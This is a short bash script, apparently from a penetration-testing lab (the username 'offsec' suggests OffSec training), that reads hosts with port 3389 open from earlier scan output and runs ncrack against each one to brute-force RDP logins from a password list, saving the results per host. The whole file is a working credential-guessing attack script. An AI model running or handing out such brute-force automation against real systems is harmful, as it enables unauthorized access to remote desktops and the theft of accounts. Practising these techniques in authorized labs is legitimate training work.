for ip in $(ls -R ../../out | grep /tcp-3389 | cut -d "/" -f 4)
do
	ncrack -vv --user offsec -P password_list.txt rdp://$ip | tee out/$ip.rdp.results

done
